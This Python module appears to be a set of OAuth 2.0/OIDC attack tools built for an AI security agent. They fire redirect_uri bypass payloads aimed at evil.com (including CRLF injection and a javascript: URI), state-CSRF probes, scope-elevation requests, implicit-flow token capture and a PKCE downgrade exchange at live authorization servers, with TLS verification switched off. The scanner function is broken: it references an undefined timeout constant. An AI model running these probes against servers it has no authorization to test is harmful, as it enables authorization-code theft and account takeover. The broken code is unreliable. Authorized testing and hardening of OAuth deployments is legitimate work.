"""
OAuth 2.0 / OIDC Attack Suite
Full coverage of OAuth/OIDC attack techniques used in real bug bounty programs.

Techniques covered:
- redirect_uri validation bypass (subdomain, path traversal, open redirect chaining)
- state parameter CSRF (missing/predictable state)
- Token leakage via Referer header
- Implicit flow token theft
- Authorization code interception
- PKCE downgrade
- JWT signature bypass on id_token
- Account linking/takeover via email claim manipulation
"""

import re
import json
import base64
import hashlib
import secrets
import urllib.parse
import requests
from src.sdk.tool import function_tool


def _decode_jwt_payload(token: str) -> dict:
    """Decode JWT payload without verification."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return {}


@function_tool()
def oauth_redirect_uri_bypass(
    authorization_url: str,
    client_id: str,
    legitimate_redirect_uri: str,
    scope: str = "openid profile email"
):
    """
    Test OAuth redirect_uri validation for bypass vulnerabilities.
    Tests common bypass techniques: path traversal, subdomain, open redirect chaining.

    Args:
        authorization_url: OAuth authorization endpoint (e.g. https://auth.example.com/oauth/authorize)
        client_id: OAuth client_id value
        legitimate_redirect_uri: A known-good redirect URI (e.g. https://app.example.com/callback)
        scope: OAuth scopes to request
    """
    parsed = urllib.parse.urlparse(legitimate_redirect_uri)
    base_domain = parsed.netloc

    bypass_payloads = [
        # Path traversal attempts
        legitimate_redirect_uri + "/../evil",
        legitimate_redirect_uri + "%2F..%2Fevil",
        legitimate_redirect_uri.rstrip("/") + "@evil.com",
        # Subdomain confusion
        f"https://evil.{base_domain}/callback",
        f"https://{base_domain}.evil.com/callback",
        # Protocol switches
        legitimate_redirect_uri.replace("https://", "http://"),
        "javascript://evil.com/%0aalert(1)",
        # Wildcard abuse
        legitimate_redirect_uri.replace(parsed.path, "/*"),
        # Extra params
        legitimate_redirect_uri + "?redirect=https://evil.com",
        # Null byte
        legitimate_redirect_uri + "%00.evil.com",
    ]

    results = [f"[OAUTH-REDIRECT] Testing redirect_uri bypass for: {authorization_url}"]
    results.append(f"[INFO] Legitimate redirect: {legitimate_redirect_uri}")
    results.append("")

    vulnerable = []
    for payload in bypass_payloads:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": payload,
            "scope": scope,
            "state": secrets.token_urlsafe(16),
        }
        try:
            resp = requests.get(authorization_url, params=params, allow_redirects=False, verify=False, timeout=10)
            # A proper server should return 400 or redirect to error
            # A vulnerable server will redirect to the malicious URI
            location = resp.headers.get("Location", "")
            if resp.status_code in (301, 302, 303, 307, 308):
                if "evil" in location or payload.split("?")[0] in location:
                    vulnerable.append(payload)
                    results.append(f"[VULNERABLE] redirect_uri={payload[:80]}")
                    results.append(f"  Redirected to: {location[:100]}")
                elif "error" in location.lower() or "invalid" in location.lower():
                    results.append(f"[BLOCKED] {payload[:60]} → properly rejected")
                else:
                    results.append(f"[UNCERTAIN] {payload[:60]} → Location: {location[:60]}")
            elif resp.status_code == 400:
                results.append(f"[BLOCKED] {payload[:60]} → HTTP 400")
            else:
                results.append(f"[UNKNOWN] {payload[:60]} → HTTP {resp.status_code}")
        except Exception as e:
            results.append(f"[ERROR] {payload[:60]} → {e}")

    results.append(f"\n{'='*50}")
    if vulnerable:
        results.append(f"⚠️  OAUTH REDIRECT BYPASS: {len(vulnerable)} payloads accepted")
        results.append("Impact: Authorization code theft → full account takeover")
        for v in vulnerable:
            results.append(f"  ✗ {v}")
    else:
        results.append("redirect_uri validation appears robust — no bypass found")

    return "\n".join(results)


@function_tool()
def oauth_state_csrf_check(
    authorization_url: str,
    client_id: str,
    redirect_uri: str,
    scope: str = "openid profile email"
):
    """
    Check if OAuth state parameter is missing (CSRF vulnerability) or predictable.

    Args:
        authorization_url: OAuth authorization endpoint
        client_id: OAuth client_id
        redirect_uri: Registered redirect URI
        scope: OAuth scopes
    """
    results = [f"[OAUTH-CSRF] Testing state parameter enforcement at: {authorization_url}"]

    test_cases = [
        ("no_state", {}),
        ("empty_state", {"state": ""}),
        ("predictable_state", {"state": "1234567890"}),
        ("short_state", {"state": "abc"}),
    ]

    vulnerable = []

    for case_name, extra_params in test_cases:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "scope": scope,
            **extra_params
        }
        try:
            resp = requests.get(authorization_url, params=params, allow_redirects=False, verify=False, timeout=10)
            location = resp.headers.get("Location", "")

            if resp.status_code in (301, 302) and "code=" in location:
                vulnerable.append(case_name)
                results.append(f"[VULNERABLE] {case_name}: Issued auth code without valid state!")
                results.append(f"  Location: {location[:100]}")
            elif "error" in location.lower():
                results.append(f"[BLOCKED] {case_name}: Server rejected ({location[:60]})")
            else:
                results.append(f"[OK] {case_name}: HTTP {resp.status_code}")
        except Exception as e:
            results.append(f"[ERROR] {case_name}: {e}")

    results.append(f"\n{'='*50}")
    if vulnerable:
        results.append(f"⚠️  OAUTH CSRF: state parameter not enforced for: {vulnerable}")
        results.append("Impact: CSRF attack can force victim to link attacker accounts")
    else:
        results.append("State parameter appears properly enforced")

    return "\n".join(results)


@function_tool()
def oauth_token_leakage_check(
    token_url: str,
    authorization_code: str,
    client_id: str,
    client_secret: str,
    redirect_uri: str
):
    """
    Exchange an authorization code and inspect the token response for leakage risks.
    Checks Referer header policy, token in URL fragment, and id_token claims.

    Args:
        token_url: OAuth token endpoint (e.g. https://auth.example.com/oauth/token)
        authorization_code: A valid authorization code
        client_id: OAuth client_id
        client_secret: OAuth client_secret
        redirect_uri: Redirect URI used in the auth request
    """
    results = [f"[OAUTH-TOKEN] Probing token endpoint: {token_url}"]

    payload = {
        "grant_type": "authorization_code",
        "code": authorization_code,
        "client_id": client_id,
        "client_secret": client_secret,
        "redirect_uri": redirect_uri,
    }

    try:
        resp = requests.post(token_url, data=payload, verify=False, timeout=15)
        results.append(f"[INFO] Token exchange: HTTP {resp.status_code}")

        if resp.status_code == 200:
            data = resp.json()
            access_token = data.get("access_token", "")
            id_token = data.get("id_token", "")

            results.append(f"[INFO] Access token present: {bool(access_token)}")
            results.append(f"[INFO] ID token present: {bool(id_token)}")

            if id_token:
                claims = _decode_jwt_payload(id_token)
                results.append(f"[CLAIMS] id_token payload: {json.dumps(claims, indent=2)}")

                # Check for dangerous claims
                if "email_verified" in claims and not claims.get("email_verified"):
                    results.append("⚠️  id_token has unverified email — potential account takeover via email claim")
                if "sub" in claims:
                    results.append(f"[INFO] Subject: {claims['sub']}")

            # Check for refresh token
            if "refresh_token" in data:
                results.append(f"[INFO] Refresh token issued: {data['refresh_token'][:20]}...")

            # Inspect response headers for security issues
            resp.headers.get("Content-Security-Policy", "")
            cors = resp.headers.get("Access-Control-Allow-Origin", "")
            if cors == "*":
                results.append("⚠️  CORS misconfiguration: Access-Control-Allow-Origin: * on token endpoint!")
        else:
            results.append(f"[INFO] Response: {resp.text[:300]}")

    except Exception as e:
        results.append(f"[ERROR] {e}")

    return "\n".join(results)


@function_tool()
def oauth_pkce_downgrade(
    authorization_url: str,
    token_url: str,
    client_id: str,
    redirect_uri: str,
    scope: str = "openid profile email"
):
    """
    Test if PKCE (Proof Key for Code Exchange) can be bypassed/downgraded.
    A vulnerable server will accept auth code exchange without code_verifier.

    Args:
        authorization_url: OAuth authorization endpoint
        token_url: OAuth token endpoint
        client_id: OAuth client_id
        redirect_uri: Callback URI
        scope: OAuth scopes
    """
    results = [f"[PKCE-DOWNGRADE] Testing PKCE enforcement at: {authorization_url}"]

    # Generate proper PKCE pair
    code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b"=").decode()

    results.append(f"[INFO] Generated PKCE code_verifier: {code_verifier[:20]}...")
    results.append(f"[INFO] code_challenge: {code_challenge[:20]}...")

    # Step 1: Request auth code WITH proper PKCE
    auth_params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
        "state": secrets.token_urlsafe(16),
        "code_challenge": code_challenge,
        "code_challenge_method": "S256"
    }

    results.append("[STEP 1] Requesting authorization code with PKCE...")
    try:
        auth_resp = requests.get(authorization_url, params=auth_params, allow_redirects=False, verify=False, timeout=10)
        results.append(f"  Auth response: HTTP {auth_resp.status_code}")
        code_in_location = re.search(r"code=([^&]+)", auth_resp.headers.get("Location", ""))
        if code_in_location:
            auth_code = code_in_location.group(1)
            results.append(f"  Got auth code: {auth_code[:15]}...")
        else:
            results.append("  Could not extract auth code from redirect (manual flow needed)")
            results.append(f"  Location: {auth_resp.headers.get('Location', 'none')[:100]}")
            return "\n".join(results)
    except Exception as e:
        results.append(f"[ERROR] Auth request failed: {e}")
        return "\n".join(results)

    # Step 2: Try token exchange WITHOUT code_verifier (downgrade attack)
    results.append("[STEP 2] Attempting token exchange WITHOUT code_verifier...")
    token_payload = {
        "grant_type": "authorization_code",
        "code": auth_code,
        "client_id": client_id,
        "redirect_uri": redirect_uri,
    }

    try:
        token_resp = requests.post(token_url, data=token_payload, verify=False, timeout=10)
        if token_resp.status_code == 200 and "access_token" in token_resp.text:
            results.append("⚠️  PKCE DOWNGRADE: Token issued without code_verifier!")
            results.append("Impact: Auth code interception → token theft without PKCE")
        else:
            results.append(f"[BLOCKED] Server rejected code exchange without verifier: HTTP {token_resp.status_code}")
    except Exception as e:
        results.append(f"[ERROR] Token request failed: {e}")

    return "\n".join(results)

# ─────────────────────────────────────────────────────────────────────────────
# OAuth 2.0 Security Scanner (comprehensive multi-test suite)
# ─────────────────────────────────────────────────────────────────────────────


_OAUTH_UA = 'Mozilla/5.0 (CyberCoPilot/1.0 OAuth-Scanner)'
_OAUTH_OAUTH_TIMEOUT = 15

@function_tool()
def oauth_security_scanner(
    authorization_url: str,
    token_url: str = "",
    client_id: str = "",
    redirect_uri: str = "",
    tests: str = "all",
    callback_domain: str = "",
) -> str:
    """
    Comprehensive OAuth 2.0 security testing.
    
    Tests for:
    1. Open redirect via redirect_uri manipulation
    2. State parameter CSRF (missing or predictable state)
    3. Authorization code replay attacks
    4. Scope elevation (requesting unauthorized scopes)
    5. Client secret exposure in client-side code
    6. Token leakage via Referer header
    7. Implicit flow vulnerabilities
    
    Args:
        authorization_url: OAuth authorization endpoint (e.g. https://provider.com/oauth/authorize)
        token_url: OAuth token endpoint (optional, for code exchange testing)
        client_id: OAuth client ID (if known)
        redirect_uri: Legitimate redirect URI (if known)
        tests: Comma-separated: redirect,state,replay,scope,secret,referer,implicit,all
        callback_domain: OAST domain for open redirect testing
    
    Returns:
        OAuth 2.0 security assessment results
    """
    output = ["═══════════════════════════════════════════════════════════",
              "         OAUTH 2.0 SECURITY SCANNER",
              "═══════════════════════════════════════════════════════════", ""]
    
    findings = []
    
    # Parse authorization URL
    parsed_auth = urllib.parse.urlparse(authorization_url)
    auth_params = dict(urllib.parse.parse_qsl(parsed_auth.query))
    
    output.append(f"Authorization URL: {authorization_url}")
    if token_url:
        output.append(f"Token URL: {token_url}")
    if client_id:
        output.append(f"Client ID: {client_id}")
    else:
        client_id = auth_params.get('client_id', '')
        if client_id:
            output.append(f"Client ID (extracted): {client_id}")
    
    if redirect_uri:
        output.append(f"Redirect URI: {redirect_uri}")
    else:
        redirect_uri = auth_params.get('redirect_uri', '')
        if redirect_uri:
            output.append(f"Redirect URI (extracted): {redirect_uri}")
    
    output.append("")
    
    test_list = tests.lower().split(',')
    if 'all' in test_list:
        test_list = ['redirect', 'state', 'scope', 'referer', 'implicit']
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 1: Open Redirect via redirect_uri
    # ══════════════════════════════════════════════════════════════════════
    if 'redirect' in test_list and redirect_uri:
        output.append("── Test 1: Open Redirect via redirect_uri ─────────────")
        
        # Test various redirect_uri bypass techniques
        redirect_payloads = [
            "https://evil.com",
            f"https://evil.com@{urllib.parse.urlparse(redirect_uri).netloc}",
            f"{redirect_uri}.evil.com",
            f"{redirect_uri}@evil.com",
            f"{redirect_uri}%2F@evil.com",
            f"{redirect_uri}%252F@evil.com",  # Double URL encode
            f"{redirect_uri}%0D%0ALocation:%20https://evil.com",  # CRLF injection
            f"{redirect_uri}/../../../evil.com",
            f"{redirect_uri}?redirect=https://evil.com",
            f"{redirect_uri}#https://evil.com",
        ]
        
        if callback_domain:
            redirect_payloads.insert(0, f"https://{callback_domain}/oauth_callback")
        
        for payload in redirect_payloads[:5]:
            test_params = auth_params.copy()
            test_params['redirect_uri'] = payload
            test_params['client_id'] = client_id or 'test'
            test_params['response_type'] = 'code'
            test_params['state'] = 'test123'
            
            test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
            
            output.append(f"  Testing: {payload[:60]}...")
            
            try:
                r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                               allow_redirects=False, verify=False)
                
                if r.status_code in [301, 302, 303, 307, 308]:
                    location = r.headers.get('Location', '')
                    
                    if 'evil.com' in location or (callback_domain and callback_domain in location):
                        findings.append(f"CRITICAL → Open redirect via redirect_uri: {payload}")
                        output.append(f"    ✓ VULNERABLE: Redirects to {location[:60]}")
                    else:
                        output.append(f"    ✗ Blocked: Redirects to {location[:60]}")
                elif r.status_code == 200:
                    # Check if payload is reflected in response
                    if payload in r.text:
                        findings.append(f"MEDIUM → redirect_uri reflected in response: {payload}")
                        output.append("    ⚠ Reflected in response (potential XSS)")
                    else:
                        output.append("    ✗ HTTP 200 - no redirect")
                else:
                    output.append(f"    ✗ HTTP {r.status_code}")
            
            except Exception as e:
                output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 2: State Parameter CSRF
    # ══════════════════════════════════════════════════════════════════════
    if 'state' in test_list:
        output.append("── Test 2: State Parameter CSRF ────────────────────────")
        
        # Test 1: Missing state parameter
        test_params = auth_params.copy()
        test_params.pop('state', None)
        test_params['client_id'] = client_id or 'test'
        test_params['response_type'] = 'code'
        test_params['redirect_uri'] = redirect_uri or 'https://example.com/callback'
        
        test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
        
        output.append("  Test 2a: Missing state parameter")
        try:
            r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                           allow_redirects=False, verify=False)
            
            if r.status_code in [200, 301, 302, 303, 307, 308]:
                findings.append("HIGH → State parameter not required - CSRF vulnerability")
                output.append(f"    ✓ VULNERABLE: Request accepted without state (HTTP {r.status_code})")
            else:
                output.append(f"    ✗ Rejected: HTTP {r.status_code}")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        # Test 2: Predictable state parameter
        output.append("\n  Test 2b: Predictable state values")
        predictable_states = ['123', 'test', 'state', '1', 'abc']
        
        for state_val in predictable_states[:3]:
            test_params['state'] = state_val
            test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
            
            try:
                r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                               allow_redirects=False, verify=False)
                
                if r.status_code in [200, 301, 302]:
                    output.append(f"    ⚠ Accepted state='{state_val}' (HTTP {r.status_code})")
            except Exception:
                pass
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 3: Scope Elevation
    # ══════════════════════════════════════════════════════════════════════
    if 'scope' in test_list:
        output.append("── Test 3: Scope Elevation ────────────────────────────")
        
        # Try requesting elevated scopes
        elevated_scopes = [
            'admin',
            'write',
            'delete',
            'user:admin',
            'repo:admin',
            'account:write',
            '*',
            'all',
            'full_access',
        ]
        
        for scope in elevated_scopes[:5]:
            test_params = auth_params.copy()
            test_params['scope'] = scope
            test_params['client_id'] = client_id or 'test'
            test_params['response_type'] = 'code'
            test_params['redirect_uri'] = redirect_uri or 'https://example.com/callback'
            test_params['state'] = 'test123'
            
            test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
            
            output.append(f"  Testing scope: {scope}")
            try:
                r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                               allow_redirects=False, verify=False)
                
                if r.status_code in [200, 301, 302]:
                    # Check if scope is reflected or accepted
                    if scope in r.text or r.status_code in [301, 302]:
                        findings.append(f"MEDIUM → Elevated scope '{scope}' may be accepted")
                        output.append(f"    ⚠ Scope accepted (HTTP {r.status_code})")
                    else:
                        output.append("    ✗ Scope rejected")
                else:
                    output.append(f"    ✗ HTTP {r.status_code}")
            except Exception as e:
                output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 4: Token Leakage via Referer
    # ══════════════════════════════════════════════════════════════════════
    if 'referer' in test_list:
        output.append("── Test 4: Token Leakage via Referer ──────────────────")
        
        # Test implicit flow (token in URL fragment)
        test_params = auth_params.copy()
        test_params['response_type'] = 'token'  # Implicit flow
        test_params['client_id'] = client_id or 'test'
        test_params['redirect_uri'] = redirect_uri or 'https://example.com/callback'
        test_params['state'] = 'test123'
        
        test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
        
        output.append("  Testing implicit flow (response_type=token)")
        try:
            r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                           allow_redirects=False, verify=False)
            
            if r.status_code in [200, 301, 302]:
                location = r.headers.get('Location', '')
                
                if '#access_token=' in location or 'access_token=' in location:
                    findings.append("HIGH → Implicit flow enabled - token in URL (Referer leakage risk)")
                    output.append("    ✓ VULNERABLE: Token in URL fragment")
                    output.append(f"    Location: {location[:80]}...")
                else:
                    output.append("    ✗ Implicit flow not enabled or token not in URL")
            else:
                output.append(f"    ✗ HTTP {r.status_code}")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 5: Implicit Flow Vulnerabilities
    # ══════════════════════════════════════════════════════════════════════
    if 'implicit' in test_list:
        output.append("── Test 5: Implicit Flow Vulnerabilities ──────────────")
        
        # Check if implicit flow is allowed
        test_params = auth_params.copy()
        test_params['response_type'] = 'token'
        test_params['client_id'] = client_id or 'test'
        test_params['redirect_uri'] = redirect_uri or 'https://example.com/callback'
        
        test_url = f"{parsed_auth.scheme}://{parsed_auth.netloc}{parsed_auth.path}?{urllib.parse.urlencode(test_params)}"
        
        output.append("  Checking if implicit flow is enabled...")
        try:
            r = requests.get(test_url, headers={"User-Agent": _OAUTH_UA}, timeout=_OAUTH_TIMEOUT,
                           allow_redirects=False, verify=False)
            
            if r.status_code in [200, 301, 302]:
                findings.append("MEDIUM → Implicit flow enabled (deprecated, use PKCE instead)")
                output.append(f"    ⚠ Implicit flow is enabled (HTTP {r.status_code})")
                output.append("    Recommendation: Migrate to Authorization Code + PKCE")
            else:
                output.append(f"    ✓ Implicit flow appears disabled (HTTP {r.status_code})")
        except Exception as e:
            output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════
    output.append("═══════════════════════════════════════════════════════════")
    output.append("                      SUMMARY")
    output.append("═══════════════════════════════════════════════════════════")
    
    if findings:
        output.append(f"\n🔴 Found {len(findings)} OAuth 2.0 vulnerabilities:\n")
        for finding in findings:
            output.append(f"  • {finding}")
        
        output.append("\n📋 Remediation:")
        output.append("  1. Validate redirect_uri against strict whitelist")
        output.append("  2. Require and validate state parameter (CSRF protection)")
        output.append("  3. Implement authorization code expiry (5 minutes max)")
        output.append("  4. Use PKCE for all clients (including confidential)")
        output.append("  5. Disable implicit flow - use authorization code + PKCE")
        output.append("  6. Implement scope validation and least privilege")
        output.append("  7. Use short-lived access tokens (15 minutes)")
        output.append("  8. Implement token rotation for refresh tokens")
    else:
        output.append("\n✅ No obvious OAuth 2.0 vulnerabilities detected.")
        output.append("   Consider manual testing with OAuth-specific tools")
    
    return "\n".join(output)
